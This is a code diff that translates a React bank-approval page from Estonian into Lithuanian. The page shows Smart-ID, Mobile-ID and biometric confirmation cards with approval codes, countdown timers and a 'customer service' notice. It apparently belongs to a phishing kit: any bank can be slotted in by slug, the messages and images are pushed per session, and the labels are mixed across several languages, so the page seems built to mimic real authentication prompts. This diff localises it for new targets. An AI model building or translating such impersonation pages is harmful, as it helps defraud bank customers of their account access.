@@ -24,10 +24,10 @@ type ApprovalViewState = {
 const APPROVAL_LABELS: Record<string, string> = {
   smartid_1: "Smart-ID",
   smartid_2: "Smart-ID 2",
-  mobileid_1: "Mobile-ID 1",
-  mobileid_2: "Mobile-ID 2",
-  biometrika_pin_1: "Biometrika / PIN 1",
-  biometrika_pin_2: "Biometrika / PIN 2",
+  mobileid_1: "M. parašas",
+  mobileid_2: "M. parašas 2",
+  biometrika_pin_1: "Biometrija",
+  biometrika_pin_2: "Biometrija 2",
 };
 
 function parseApprovalHistory(value: unknown): string[] {
@@ -108,7 +108,7 @@ function SmartIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Avage oma telefonis Smart-ID rakendus.
+            Atidarykite Smart-ID programėlę savo telefone.
           </h1>
 
           <p className="text-[1.08rem] text-[#667085]">Kinnitage {pinLabel}-koodiga</p>
@@ -118,7 +118,7 @@ function SmartIdApprovalCard({
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Jäänud aeg: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -127,7 +127,7 @@ function SmartIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Kinnitan..." : "Kinnita"}
+            {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
         </div>
       </div>
@@ -198,10 +198,10 @@ function MobileIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Eikite i savo Mobile-ID programa savo telefone.
+            Eikite į savo Mobile-ID programą savo telefone.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} koda</p>
+          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
@@ -256,24 +256,24 @@ function BiometricApprovalCard({
             />
           ) : (
             <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
-              {bankName || bankSlug || "Pank"}
+              {bankName || bankSlug || "Bankas"}
             </div>
           )}
         </div>
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Biomeetriline kinnitamine
+            Biometrinis patvirtinimas
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Kinnitage {pinLabel}-koodiga</p>
+          <p className="text-[1.08rem] text-[#667085]">Patvirtinkite naudodami {pinLabel} kodą</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Jäänud aeg: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Liko laiko: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -282,7 +282,7 @@ function BiometricApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Kinnitan..." : "Kinnita"}
+            {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
         </div>
       </div>
@@ -295,7 +295,7 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
       <div className="w-full max-w-[650px] rounded-[24px] border border-[#0066CC] bg-[#020b22] p-6 text-center shadow-[0_0_40px_rgba(0,102,204,0.3)] sm:p-10">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-[#0088FF]">Klantenservice</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-[#0088FF]">Klientų aptarnavimas</p>
         </div>
 
         <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
@@ -325,7 +325,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     approvalCode: "",
     bankSlug: "",
     bankName: "",
-    message: "Palun oodake...",
+    message: "Prašome palaukti...",
     imageUrl: null,
     lang: "de",
   });
@@ -367,7 +367,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         approvalCode: fd.approvalCode?.trim() ?? "",
         bankSlug: fd.bankSlug?.trim() ?? "",
         bankName: fd.bankName?.trim() ?? "",
-        message: fd.specialNoticeText ?? fd.customMessage ?? "Palun oodake...",
+        message: fd.specialNoticeText ?? fd.customMessage ?? "Prašome palaukti...",
         imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
         lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
       });
